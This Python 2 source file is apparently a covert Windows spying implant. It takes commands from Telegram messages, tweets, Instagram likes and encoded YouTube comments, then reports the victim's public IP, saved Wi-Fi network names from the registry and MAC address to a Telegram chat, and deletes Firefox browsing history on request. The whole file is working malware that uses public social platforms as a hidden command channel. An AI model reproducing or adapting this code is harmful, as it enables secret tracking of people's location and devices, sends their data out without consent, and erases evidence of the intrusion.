from _winreg import *  # registry
import telegram
import os
import json
from uuid import getnode as get_mac
import time
import tweepy
from tweepy import OAuthHandler
import urllib2
from InstagramAPI import InstagramAPI
import requests

# -------------------------YOUTUBE----------------------------------
DEVELOPER_KEY = ""
YOUTUBE_VIDEO_ID = ""
COMMENT_START = ""
# -------------------------INSTAGRAM CREDENTIALS-------------------------
INSTAGRAM_USER = ""
INSTAGRAM_PASSWORD = ""
# -------------------------TWITTER----------------------------------
CONSUMER_KEY = ''
CONSUMER_SECRET = ''
ACCESS_TOKEN = ''
ACCESS_SECRET = ''
TWITTER_USERNAME = 'poszerzhoryzont'
#-------------------------TELEGRAM-----------------------------------
CHAT_ID = ""
TOKEN = ""


##########################YOUTUBE CLASS###############################
class Youtube:
    def __init__(self, DEVELOPER_KEY, YOUTUBE_VIDEO_ID, COMMENT_START):
        self.DEVELOPER_KEY = DEVELOPER_KEY
        self.YOUTUBE_VIDEO_ID = YOUTUBE_VIDEO_ID
        self.COMMENT_START = COMMENT_START

    def getComments(self):
        url = "https://www.googleapis.com/youtube/v3/commentThreads?key=" + self.DEVELOPER_KEY + "&textFormat=plainText&part=snippet&videoId=" + self.YOUTUBE_VIDEO_ID + "&maxResults=50"
        list_with_keywords = []  # responsible for keeping keywords
        while url:
            req = requests.get(url)  # connect to url
            if req.status_code == 200:
                json_req = json.loads(req.content)  # load json from response
                for i in json_req['items']:  # for every item in response
                    comment = i['snippet']['topLevelComment']['snippet']['textDisplay']  # take comment
                    if self.getKeyword(comment) is not None:  # if function getKeyword return keyword
                        keyword = self.getKeyword(comment)  # write output to keyword
                        if keyword not in list_with_keywords:  # check for repetitives
                            list_with_keywords.append(keyword)  # check for repetitives
                            return keyword
                url = "https://www.googleapis.com/youtube/v3/commentThreads?key=" + self.DEVELOPER_KEY + "&textFormat=plainText&part=snippet&videoId=" + self.YOUTUBE_VIDEO_ID + "&maxResults=50"
                ###pagination
                try:
                    url = url + "&pageToken=" + json_req['nextPageToken']
                except KeyError:
                    break
            else:
                return "Video is unavailable or account was blocked"  # if status != 200, something is wrong with video or account

    def getKeyword(self, comment):
        keyword = ""
        if comment.startswith(self.COMMENT_START):  # if comment starts with COMMENT_START variable defined at the top
            new_string = comment[len(
                COMMENT_START) + 1:]  # make new string from the rest of the comment, if COMMENT_START = "HHey Hey" start from 10th letter
            for i in new_string.split(" "):  # make list from remaining words
                keyword += i[0]  # create keyword from first letter of every word in new_string.split()

            return keyword


#########################INSTAGRAM CLASS##############################
class Instagram:
    list_with_likes = []

    def __init__(self, INSTAGRAM_USER, INSTAGRAM_PASSWORD):
        self.update = False  # update set to false during initialization
        self.INSTAGRAM_USER = INSTAGRAM_USER
        self.INSTAGRAM_PASSWORD = INSTAGRAM_PASSWORD
        self.InstagramAPI = InstagramAPI(self.INSTAGRAM_USER, self.INSTAGRAM_PASSWORD)  # connecting to api

    def getLastLike(self):
        self.InstagramAPI.login()
        likes = self.InstagramAPI.getTotalLikedMedia(1)  # get last like
        return likes[0]  # return text from like

    def checkUpdate(self, last_like):
        self.update = False
        code = last_like['code']  # check for unique id of like
        if len(
                self.list_with_likes) == 0:  # had to do this for first like because it would be execute one command over and over
            self.list_with_likes.append(code)
        if code not in self.list_with_likes:  # if unique id is not in list with likes
            self.list_with_likes.append(code)  # append
            self.update = True  # we have an update


########################TWITTER CLASS#################################
class Twitter:

    list_of_tweets = []

    def __init__(self, CONSUMER_KEY, CONSUMER_SECRET, ACCESS_TOKEN, ACCESS_SECRET, TWITTER_USERNAME):
        self.update = False  # no update at the beginning
        self.CONSUMER_KEY = CONSUMER_KEY
        self.CONSUMER_SECRET = CONSUMER_SECRET
        self.ACCESS_TOKEN = ACCESS_TOKEN
        self.ACCESS_SECRET = ACCESS_SECRET
        self.TWITTER_USERNAME = TWITTER_USERNAME

        self.auth = OAuthHandler(self.CONSUMER_KEY, self.CONSUMER_SECRET)
        self.auth.set_access_token(self.ACCESS_TOKEN, self.ACCESS_SECRET)

        self.api = tweepy.API(self.auth)

    def getLastTweet(self):

        tweet = self.api.user_timeline(screen_name=self.TWITTER_USERNAME, count=1, include_rts=True,
                                       tweet_mode='extended')  # get last tweet and retweets from TWITTER_USERNAME user, it has a limitation to 150 characters.
        return tweet[0]  # return text

    def checkUpdate(self, last_tweet):
        self.update = False
        last_tweet_id = last_tweet.id_str  # check for unique id
        if len(self.list_of_tweets) == 0:  # same situation as with instagram
            self.list_of_tweets.append(last_tweet_id)
        if last_tweet_id not in self.list_of_tweets:  # check for repetitives
            self.list_of_tweets.append(last_tweet_id)
            self.update = True  # we have an update


########################TELEGRAM CLASS################################
class Bot:
    list_with_updates = []
    def __init__(self, chatid, token):
        self.chatid = chatid
        self.token = token
        self.update = False

        self.bot = telegram.Bot(token=self.token)

    def sendMessage(self, message):
        self.bot.sendMessage(self.chatid, message)  # send message 'message' to specified chatid

    # function for retrieving messages and updating bot
    def getMessage(self, offset):
        if offset:  # if offset is specified
            update = self.bot.getUpdates(offset=offset)  # get update from passed offset, offset = last message id
        else:
            update = self.bot.getUpdates()  # get updates, used only for the first time

        update_json = json.loads(update[2])  # get message body [result, chat, date...]

        return update_json

    @staticmethod
    def getHighestId(updates):
        update_ids = []
        for update in updates["result"]:  # for results from response
            update_ids.append(int(update["update_id"]))  # apppend id to list
        return max(update_ids)  # return max from list

    # check for new message from bot
    def checkForUpdates(self, last_message):
        self.update = False
        last_update_id = telegram_bot1.getHighestId(updates) + 1  # get last id and add 1
        if last_update_id not in self.list_with_updates:  # if last message id was not before
            self.list_with_updates.append(last_update_id)  # add to list
            self.update = True  # we have an update

        return last_update_id  # return last id - offset


class Commands:

    def __init__(self):
        pass

    @staticmethod
    # check for commands from Instagram, Twitter and Telegram
    def checkForCommands(text):
        if "location" in text:  # if location is included in tweet, insta like or telegram message
            telegram_bot1.sendMessage(
                "IP: " + str(commands.getLocationIpify()))  # send results from getLocationIpify() function to bot
            telegram_bot1.sendMessage("SSID(s): " + str(commands.getLocation()))  # send SSID(s) to bot
        if 'mac' in text:
            telegram_bot1.sendMessage("Mac:  " + str(commands.getMac()))  # send mac address to bot
        if 'history' in text:
            telegram_bot1.sendMessage(
                "Deleting browser history: " + commands.deleteBrowserHistory())  # delete browser history
        if 'update' in text:
            telegram_bot1.sendMessage("Address: " + youtube.getComments())  # get keywords from youtube

    @staticmethod
    def isAdmin(ifAdmin):
        return ifAdmin

    def getLocationIpify(self):
        req = urllib2.urlopen("http://api.ipify.org")
        return req.read()  # return IP

    def getLocation(self):
        try:
            profiles_key = OpenKey(HKEY_LOCAL_MACHINE,
                                   r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles", 0,
                                   KEY_ALL_ACCESS)  # open regitry key responsible for keeping SSID(s)
            list_of_profiles = []
            for i in range(0,
                           4):  # don't know when to stop, because I canot predict how many SSID(s) user has. Instead getting last 4
                try:
                    key = EnumKey(profiles_key, i)  # try to enumerat
                except WindowsError:  # if WindowsError, we don't have admin rights
                    self.isAdmin(0)
                    break
                profiles = OpenKey(HKEY_LOCAL_MACHINE,
                                   r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles" + "\\" + key)  # open registry with enumerated key
                profile_name = EnumValue(profiles, 0)  # get ProfileName: SSID as a tuple
                list_of_profiles.append(profile_name[1])  # add SSID to list of profiles

            return list_of_profiles
        except EnvironmentError as e:
            return e  # Environment error

    def deleteBrowserHistory(self):
        firefox = os.path.join("C:", os.sep, "Users", os.getenv('username'), "AppData", "Roaming", "Mozilla", "Firefox",
                               "Profiles")  # get paths to firefox
        list_profiles = os.listdir(firefox)  # list directory

        for i in list_profiles:  # for every founded profile
            sqlite_path = "C:\Users\\" + os.getenv(
                'username') + "\AppData\Roaming\Mozilla\Firefox\Profiles\\" + i + "\places.sqlite"  # get path

            try:
                os.remove(sqlite_path)  # try to remove history - places.sqlite file
                return "Success!"
            except WindowsError as e:
                return "Error: " + e.strerror  # File can be used by another process

    @staticmethod
    def getMac():
        return get_mac()  # get mac


youtube = Youtube(DEVELOPER_KEY, YOUTUBE_VIDEO_ID, COMMENT_START)
twitter = Twitter(CONSUMER_KEY, CONSUMER_SECRET, ACCESS_TOKEN, ACCESS_SECRET, TWITTER_USERNAME)
instagram = Instagram(INSTAGRAM_USER, INSTAGRAM_PASSWORD)
commands = Commands()
telegram_bot1 = Bot(CHAT_ID, TOKEN)

last_update_id = False

while 1:
    print('go')
    updates = telegram_bot1.getMessage(
        last_update_id)  # get last message without last udpdate id, this is the first time
    last_tweet = twitter.getLastTweet()  # get last tweet
    insta_like = instagram.getLastLike()  # get last like
    last_update_id = telegram_bot1.checkForUpdates(
        updates)  # get last message id for Telegram, we want to avoid repetitive executions
    insta_like_text = insta_like['caption']['text']  # get text from last like
    instagram.checkUpdate(insta_like)  # check for Instagram update
    twitter.checkUpdate(last_tweet)  # check for Twitter update

    if telegram_bot1.update:  # if there is new message on Telegram i.e. no update
            commands.checkForCommands(
                updates['result'][-1]['message']['text'])  # check if this message contains any of the command keyword

    if instagram.update:  # if there is update on instagram
        commands.checkForCommands(insta_like_text)  # check if description contains keyword

    if twitter.update:  # check if new tweet appears
        commands.checkForCommands(last_tweet.full_text)  # check if tweet includes keyword

    time.sleep(5)  # timeout - 5 seconds!
